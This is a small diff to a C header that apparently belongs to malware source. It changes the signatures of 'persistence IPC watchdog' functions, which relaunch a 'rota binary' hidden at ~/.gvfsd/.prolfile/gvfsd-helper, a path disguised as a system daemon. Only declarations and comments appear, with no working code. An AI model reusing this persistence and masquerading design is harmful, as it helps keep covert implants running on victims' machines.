@@ -71,7 +71,7 @@ bool write_to_file(char *fpath, char *data);
  * @param char pointer to file path to exec (rota binary)
  * @return N/A
  * */
-void *watchdog_process_shmget(void *fpath);
+void *watchdog_process_shmget();
 
 
 /**
@@ -79,7 +79,7 @@ void *watchdog_process_shmget(void *fpath);
  *@param fpath char pointer to file path to exec (rota binary)
  *@return N/A
  * */
-void *watchdog_process_shmread(void *fpath);
+void *watchdog_process_shmread();
 
 /**
  * @brief spawn a thread for persistence IPC watchdog processes
@@ -87,7 +87,7 @@ void *watchdog_process_shmread(void *fpath);
  * @param fpath file path to rota  (~/.gvfsd/.prolfile/gvfsd-helper)
  * @return N/A
  **/
-void spawn_thread_watchdog(int some_id, char *fpath);
+void spawn_thread_watchdog(int some_id);
 
 
 /**
